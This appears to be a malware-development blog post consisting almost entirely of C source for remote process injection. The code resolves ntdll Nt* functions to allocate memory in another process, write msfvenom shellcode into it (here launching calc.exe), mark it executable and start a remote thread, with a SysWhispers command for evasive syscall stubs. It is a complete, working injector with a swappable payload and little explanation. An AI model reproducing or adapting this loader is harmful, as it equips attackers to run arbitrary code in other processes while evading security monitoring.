---
title: "Syscalls-ProcessInjection"
date: 2026-06-19 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# Syscalls-ProcessInjection


## Syscalls-processinjection.c

```c
/*
	Explaination:
		- We are going to implement remote process injection with syscalls. Below will be the WinAPI and their syscall replacement
			VirtualAlloc -> NtAllocateVirtualMemory
			VirutalProtect -> NtProtectVirutalMemory
			WriteProcessMemory -> NtWriteVirtualMemory
			CreateThread -> NtCreateThreadEx

			python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o SysWhispers -v
*/

#include <Windows.h>
#include <stdio.h>
#include "structs.h"

// Remote target process ID
#define PROCESS_ID	10360

// msfvenom, calc.exe
unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// A structure that keeps the syscalls used
typedef struct _Syscall {

	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
	fnNtCreateThreadEx        pNtCreateThreadEx;

} Syscall, *PSyscall;


/*
	Function: to populate the St structure
*/
BOOL InitSyscallStruct(_Out_ PSyscall St) {
	
	// Get handle to address of ntdll
	HMODULE hNtdll = GetModuleHandle(L"NTDLL.DLL");
	if (!hNtdll) {
		printf("[!] GetModuleHandle Failed %d \n", GetLastError());
		return FALSE;
	}

	// Resolve each NT function address
	St->pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	St->pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	St->pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	St->pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	// Verify struct hold address (not empty)
	if (!St->pNtAllocateVirtualMemory ||
		!St->pNtProtectVirtualMemory ||
		!St->pNtWriteVirtualMemory ||
		!St->pNtCreateThreadEx)
	{
		printf("[!] One or more Nt functions were not found!\n");
		return FALSE;
	}

	return TRUE;
}

/*
	Function: Inject shellcode via syscall into remote thread
		hProcess -> Handle to target process
		pShellcode -> Pointer to shellcode memory address
		sShellcodeSize -> Hold size of shellcode in bytes

		1. Allocate memory in remote process
		2. Write shellcode into allocated memory
		3. Update memory to be executable
		4. Create remotethread at shellcode entry point
*/
BOOL SyscallRemoteInjection(_In_ HANDLE hProcess, _In_ PVOID pShellcode, _In_ SIZE_T sShellcodeSize) {

	Syscall St = { 0 };
	NTSTATUS STATUS = 0x00;
	PVOID pAddress = NULL;
	ULONG uOldProtect = 0;
	SIZE_T sSize = sShellcodeSize, sNumOfBytesWritten = 0;
	HANDLE hThread = NULL;

	// Initialize the syscall structure with function pointers from ntdll.dll
	if (!InitSyscallStruct(&St)) {
		printf("[!] Failed To initilize Syscall Struct ! \n");
		return FALSE;
	}


	// Allocating memory through Syscall
	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] pNtAllocateVirtualMemory Failed 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	printf("[+] Memory Allocated At: 0x%p of Size (Bytes): %d \n", pAddress, sSize);
	printf("[+] Press <Enter> To Write Payload \n");
	getchar();

	// Writing shellcode through Syscall
	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &sNumOfBytesWritten)) != 0 || sNumOfBytesWritten != sShellcodeSize) {
		printf("[!] pNtWriteVirtualMemory Failed 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Update permissions to RWX through Syscall
	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &pAddress, &sShellcodeSize, PAGE_EXECUTE_READWRITE, &uOldProtect)) != 0) {
		printf("[!] pNtProtectVirtualMemory Failed 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Executing shellcode into remote thread
	printf("[+] Press <Enter> To Inject Shellcode! \n");
	getchar();
	printf("[+] Thread Entry Point 0x%p \n", pAddress);

	// Creating remote thread
	if ((STATUS = St.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] pNtCreateThreadEx Failed 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Thread Created With PID: %d \n", GetThreadId(hThread));

	return TRUE;
}


int main() {
	HANDLE hProcess = NULL;

	// Open handle to the target process with full access rights
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);

	if (!SyscallRemoteInjection(hProcess, shellcode, sizeof(shellcode))) {
		return -1;
	}

	printf("[+] Press <Enter> To Exit! \n");
	getchar();

	return 0;
}


```

